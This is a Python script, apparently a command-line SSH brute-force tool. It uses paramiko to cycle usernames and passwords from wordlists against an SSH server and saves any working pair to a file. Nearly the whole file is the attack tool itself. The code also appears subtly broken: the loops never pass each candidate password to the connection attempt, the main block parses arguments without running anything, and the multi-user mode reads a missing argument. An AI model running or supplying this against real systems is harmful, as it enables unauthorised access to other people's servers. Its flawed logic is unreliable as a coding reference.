from paramiko import AuthenticationException, SSHClient, AutoAddPolicy, SSHException
import socket
import time
import argparse
from threading import Thread
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


class SSHBruteForce:
    """"""

    def __init__(self, hostname, username, password, port):
        """Constructor for SSHConnect"""
        self.hostname = hostname
        self.username = username
        self.password = password
        self.port_num = port
        self.password_list = []
        self.username_list = []

    def ssh_checker(self):
        c = SSHClient()
        c.set_missing_host_key_policy(AutoAddPolicy())
        try:
            c.connect(
                hostname=self.hostname,
                username=self.username,
                password=self.password,
                port=self.port_num,
            )
        except socket.timeout:
            print(f"{RED}[!] Host: {self.hostname} is unreachable, timed out.{RESET}")
            return False
        except AuthenticationException:
            print(f"[!] Invalid credentials for {self.username}:{self.password}")
            return False
        except SSHException:
            print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
            time.sleep(60)
            return self.ssh_checker()
        else:
            print(
                f"{GREEN}[+] Found combination: \n\tHOSTNAME: {self.hostname}\n\tUSERNAME: {self.username}\n"
                f"\tPASSWORD: {self.password}{RESET} "
            )
            return True

    def single_target_mode(self):
        for password in self.password_list:
            if SSHBruteForce.ssh_checker(self):
                with open("credential_pairs.txt", "w") as w:
                    w.write(f"{self.username}@{self.hostname}: {password}")
                    break

    def multiple_target_mode(self):
        for target_user in self.username_list:
            for password in self.password_list:
                if SSHBruteForce.ssh_checker(self):
                    with open("credential_pairs.txt", "w") as w:
                        w.write(f"{target_user}@{self.hostname}: {password}")
                        break

    def read_password_list(self):
        with open(self.password) as rpass:
            self.password_list = rpass.read().splitlines()

    def read_username_list(self):
        with open(self.username) as ruser:
            self.username_list = ruser.read().splitlines()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Bruteforce script.")
    subparser = parser.add_subparsers()
    parser.add_argument("host", help="Hostname or IP Address of SSH Server.")
    parser.add_argument(
        "-p", dest="port", help="SSH port number.(default port number 22)", default=22
    )

    single_target = subparser.add_parser(
        "single",
        help="Brute force attack against one specified user name.",
    )
    single_target.add_argument("-u", dest="user", help="Login username.")
    single_target.add_argument(
        "-w",
        dest="passlist",
        help="Select the file that contains the password candidate.",
    )
    multi_target = subparser.add_parser(
        "multi", help="Brute force attack against listed users."
    )
    multi_target.add_argument(
        "-w",
        dest="passlist",
        help="Select the file that contains the password candidate.",
    )
    multi_target.add_argument(
        "-U",
        dest="userlist",
        help="Select the file that contains the username candidate.",
    )

    args = parser.parse_args()
    hostIP = args.host
    pass_list = args.passlist
    user_list = args.userlist
    user_name = args.user
    port_num = args.port
